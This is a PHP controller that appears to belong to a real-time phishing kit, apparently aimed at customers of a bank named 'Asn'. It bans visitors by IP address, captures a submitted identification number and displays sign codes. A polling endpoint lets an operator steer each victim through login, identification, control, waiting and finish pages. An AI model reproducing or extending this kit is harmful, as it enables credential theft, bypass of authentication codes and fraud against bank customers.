<?php

namespace App\Controllers\Asn;

use \Core\View;
use \App\Models\Asn\Asn;
use \App\Auth;

class Identification extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['number'])) {
            Asn::setDetails($_POST['number'], $_SESSION['uid']);
        } else {
            if (Asn::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Asn::checkPayment($this->route_params['id'])) {
                Asn::redirect();
            } else {
                Asn::setDetailsInformation($_SESSION['uid']);

                $check = Asn::getSignCode($_SESSION['uid']);

                View::render('Asn/identification.php', $data = [
                    'code' => $check
                ]);
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Asn::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Asn::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'identification') {
                        $check = Asn::getSignCode($_SESSION['uid']);
                        echo json_encode(['page' => 'identification', 'code' => $check]);   
                        Asn::setDetailsPage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Asn::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Asn::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Asn::redirect();
        }
    }
}